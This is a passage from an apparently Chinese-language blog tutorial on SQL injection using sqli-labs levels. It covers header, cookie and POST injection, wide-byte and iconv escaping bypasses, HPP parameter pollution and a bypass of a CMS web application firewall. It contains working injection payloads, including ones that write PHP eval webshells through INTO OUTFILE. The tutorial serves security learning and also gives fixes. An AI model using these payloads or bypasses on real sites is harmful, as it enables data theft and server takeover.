class=\"line\">\t&#123;</span><br><span class=\"line\">\tif(!empty($value))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t// truncation (see comments)</span><br><span class=\"line\">\t\t$value = substr($value,0,20);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Stripslashes if magic quotes enabled</span><br><span class=\"line\">\t\tif (get_magic_quotes_gpc())</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = stripslashes($value);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Quote if not a number</span><br><span class=\"line\">\t\tif (!ctype_digit($value))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t$value = intval($value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\treturn $value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数据库中接收参数的语句为 </span><br><span class=\"line\">\t$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class=\"line\">\t$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&#x27;127.0.0.1&#x27;,&#x27;sb&#x27;)#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br><span class=\"line\">//但加如)后会导致列数不匹配,后面还需要补充两列</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20，21，22</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie</p>\n<p>后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqllabs less11  - less14</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 <code>gbk</code></p>\n<p>一个 <code>gbk</code>  编码汉字，占用 2 个字节。一个 <code>utf-8</code>  编码的汉字，占用 3 个字节。</p>\n<p>假设我们有以下代码，并且我们的 <code>magic_quotes_gpc</code>  是关闭的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class=\"line\">$conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;toor!@#$&#x27;) or die(&#x27;bad!&#x27;);</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_select_db(&#x27;test&#x27;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class=\"line\">//执行sql语句</span><br><span class=\"line\">$id = isset($_GET[&#x27;id&#x27;]) ? addslashes($_GET[&#x27;id&#x27;]) : 1;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM news WHERE tid=&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class=\"line\">$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class=\"line\">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class=\"line\">echo &quot;&lt;h2&gt;&#123;$row[&#x27;title&#x27;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&#x27;content&#x27;]&#125;&lt;p&gt;\\n&quot;;</span><br><span class=\"line\">mysql_free_result($result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>如果我们想注入，那么必须绕过 <code>addslashes</code>  的过滤，我们可以有两种思路：</p>\n<blockquote>\n<p>1. 想办法给 <code>\\</code>  前面再加一个 <code>\\</code> （或单数个即可），变成 <code>\\\\'</code> ，这样 <code>\\</code>  被转义了， <code>'</code>  逃出了限制</p>\n<p>2. 想办法把 <code>\\</code>  弄没有。</p>\n</blockquote>\n<p>我们先说把 <code>\\</code>  弄没有的情况</p>\n<p>mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 <code>%df'</code>  看会怎样：</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111ß\\''' at line 1</code></p>\n<p>此时出现报错，说明存在注入</p>\n<p>这就是 mysql 的特性，因为 <code>gbk</code>  是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code>  和后面的 <code>addslash</code>  加的 <code>\\</code>  也就是 <code>%5c</code>  变成了一个汉字 <code>運</code> ，而 <code>'</code>  逃逸了出来。</p>\n<p>因为两个字节代表一个汉字，所以我们可以试试 <code>%df%df%27</code> ：</p>\n<p>此时不报错了， <code>%df%df</code>  拼成了一个汉字， <code>%5c%27</code>  因为 <code>27</code>  不大于 128，不构成汉字。所以根据这个特性，我们用 <code>1%a1'</code>  也可以。</p>\n<p><code>%a1%5c</code>  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 <code>%27</code>  逃逸了出来。</p>\n<p>但如果我们把 gbk 换成 gb2312，我们的 <code>%df%5c%27</code>  又不能注入了</p>\n<p>这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿</p>\n<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案1</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_real_escape_string</span><br></pre></td></tr></table></figure>\n<p>第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案2</span><br><span class=\"line\">//只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class=\"line\">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>\n<p>我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>\n<p>接下来是双重转义的情况 —iconv 导致的致命后果</p>\n<p>(划重点，好好看，后面 file include 中会考这个函数)</p>\n<p>有些 cms 会使用如下字符集转换函数防止乱码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>当我们输入 <code>錦'</code>  时，他又报错了，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code></p>\n<p>当他从 utf8 转成 gbk 时，变成了 <code>%e5%5c%27</code> ，这时多管闲事的 addslashes 又送来了一个 <code>\\</code> ，变成了 <code>%e5%5c%5c%27</code> ，两个 5c 形成了双重转义，对 <code>'</code>  的转义失效，注入产生</p>\n<p>如果我们此时从 gbk 转为 utf8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>我们再次输入 <code>%aa'</code> ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 <code>\\</code>  前面的字符是奇数， <code>\\</code>  就会被吞掉， <code>'</code>  逃逸</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错：</p>\n<p>而 <code>\\</code>  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \\</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s\">浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)</span></p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>sqllabs less 29:</p>\n<p>在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染</p>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;id=-2%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"通过hppphp绕过贷齐乐waf\"><a class=\"markdownIt-Anchor\" href=\"#通过hppphp绕过贷齐乐waf\">#</a> 通过 HPP+PHP 绕过贷齐乐 waf</h6>\n<p>此处的 waf 会经过两层过滤，第一层过滤</p>\n<p>/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class sqlin &#123;</span><br><span class=\"line\">\tfunction dowith_sql($str) &#123;</span><br><span class=\"line\">\t\t$check= eregi(&#x27;select|insert|update|delete|\\&#x27;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile&#x27;, $str);</span><br><span class=\"line\">\t\tif($check)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\techo &quot;非法字符!&quot;;</span><br><span class=\"line\">\t\t\texit();</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>第二层过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* 检查和转义字符 */</span><br><span class=\"line\">function safe_str($str)&#123;</span><br><span class=\"line\">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">        if( is_array($str) ) &#123;</span><br><span class=\"line\">            foreach($str as $key =&gt; $value) &#123;</span><br><span class=\"line\">                $str[$key] = safe_str($value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $str = addslashes($str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function dhtmlspecialchars($string) &#123;</span><br><span class=\"line\">    if(is_array($string)) &#123;</span><br><span class=\"line\">        foreach($string as $key =&gt; $val) &#123;</span><br><span class=\"line\">            $string[$key] = dhtmlspecialchars($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $string = str_replace(array(&#x27;&amp;&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;), array(&#x27;&amp;amp;&#x27;, &#x27;&amp;quot;&#x27;, &#x27;&amp;lt;&#x27;, &#x27;&amp;gt;&#x27;,&#x27;（&#x27;,&#x27;）&#x27;), $string);</span><br><span class=\"line\">        if(strpos($string, &#x27;&amp;amp;#&#x27;) !== false) &#123;</span><br><span class=\"line\">            $string = preg_replace(&#x27;/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;, &#x27;&amp;\\\\1&#x27;, $string);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $string;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此该系统对于输入处理的过程如下</p>\n<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>\n<p>但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$request_uri = explode(&quot;?&quot;, $_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class=\"line\">if (isset($request_uri[1])) &#123;</span><br><span class=\"line\">\t$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class=\"line\">\tforeach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$_value = explode(&quot;=&quot;, $value);</span><br><span class=\"line\">\t\tif (isset($_value[1])) &#123;</span><br><span class=\"line\">\t\t\t$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义</p>\n<p>当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf</p>\n<p>但 php 的另一个特性：</p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>也就是说，php 会认为 i_d 和 i.d 是同一个参数</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>因此在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>如果我们要利用这个特性，那么必须满足几点：</p>\n<p>1. 有注入点</p>\n<p>2. 注入点可控变量需要获取自 $_REQUEST</p>\n<p>3. 变量的名字必须包含下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static function GetOne($data = array())&#123;</span><br><span class=\"line\">    global $mysql;</span><br><span class=\"line\">    $user_id = isset($data[&#x27;user_id&#x27;])?$data[&#x27;user_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $username = isset($data[&#x27;username&#x27;])?$data[&#x27;username&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $password = isset($data[&#x27;password&#x27;])?$data[&#x27;password&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $email = isset($data[&#x27;email&#x27;])?$data[&#x27;email&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $type_id = isset($data[&#x27;type_id&#x27;])?$data[&#x27;type_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class=\"line\">         `user_id` int(11) NOT NULL DEFAULT &#x27;0&#x27;)&quot;;</span><br><span class=\"line\">    $mysql -&gt;db_query($sql);</span><br></pre></td></tr></table></figure>\n<p>以上代码满足了上面的三个要求</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//由于=被过滤，需要使用like，同时对数据库进行16进制编码</span><br><span 